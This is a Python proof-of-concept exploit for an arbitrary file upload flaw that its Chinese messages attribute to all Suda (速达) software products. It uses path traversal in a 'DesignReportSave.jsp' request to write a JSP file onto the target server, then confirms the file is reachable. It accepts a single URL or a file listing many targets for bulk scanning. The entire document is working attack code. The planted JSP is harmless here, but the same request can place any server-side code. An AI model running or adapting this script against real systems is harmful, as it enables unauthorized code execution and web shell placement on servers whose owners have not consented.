# -*- coding: utf-8 -*-
import requests
import argparse
poc = "/report/DesignReportSave.jsp?report=../625248.jsp"
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type": "application/octet-stream"
    }
data = '''<% out.print("This is a page !");%>'''
def chack(url):
    try:
        reps = requests.post(url=url+poc,headers=headers,data=data,verify=False,timeout=5)
        shell_path = url+"/625248.jsp"
        repps = requests.get(url=shell_path,headers=headers,verify=False,timeout=3)
        if repps.status_code == 200:
            print(f"[+] 存在速达软件存在任意文件上传 url : {shell_path}")
        else:
            print(f"未发现速达软件存在任意文件上传 url : {url}")
    except Exception as e:
        print(f"ERROR : {e}")

def main():
    parser = argparse.ArgumentParser(description='A simple script to demonstrate argparse.')
    parser.add_argument('-u', '--url', type=str, help='URL to process')
    parser.add_argument('-f', '--file', type=str, help='File path to process')

    args = parser.parse_args()
    if args.url:
        chack(args.url)

    elif args.file:
        with open(args.file, 'r') as file:
            lines = file.readlines()
            for line in lines:
                chack(line.strip())

    else:
        print("eg : python3 速达软件全系产品存在任意文件上传.py -u http://xx.xx.x.x")
        print("eg : python3 速达软件全系产品存在任意文件上传.py -f 123.txt")

if __name__ == '__main__':
    main()







